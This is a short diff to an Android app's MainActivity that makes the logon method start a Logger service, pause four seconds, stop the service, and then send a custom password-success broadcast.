@@ -14,6 +14,17 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void logon(View v) {
+        Intent a = new Intent(this, Logger.class);
+        startService(a);
+
+        try {
+            Thread.sleep(4000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
+        stopService(a);
+
         Intent i = new Intent();
         i.setAction("android.intent.action.ACTION_PASSWORD_SUCCESSED");
 
